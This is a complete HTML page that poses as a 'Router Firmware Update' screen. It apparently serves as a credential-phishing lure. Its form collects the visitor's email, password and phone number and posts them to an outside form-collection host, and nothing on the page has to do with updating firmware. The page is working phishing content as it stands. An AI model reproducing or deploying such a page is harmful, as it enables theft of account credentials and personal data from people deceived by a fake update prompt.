<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Firmware Update</title>
    <link rel="stylesheet" href="wifi.css">
</head>
<body>
    <div class="container">
        <h4>Router Firmware Update</h4>
        <img src="firmware.jpg" alt="Firmware Update" width="400" height="300">
        
        <form id="contact-form" action="https://getform.io/f/blljnpwb" method="POST">
            <label for="email">Email:</label><br>
            <input type="email" id="email" name="your-email" placeholder="Enter your email" required><br><br>

            <label for="password">Password:</label><br>
            <input type="password" id="password" name="your-password" placeholder="Enter your password" required><br><br>

            <label for="phone">Phone Number:</label><br>
            <input type="tel" id="phone" name="your-phonenumber" placeholder="Enter your phone number" required><br><br>

            <input type="submit" value="Submit" id="submit">
        </form>
    </div>
</body>
</html>
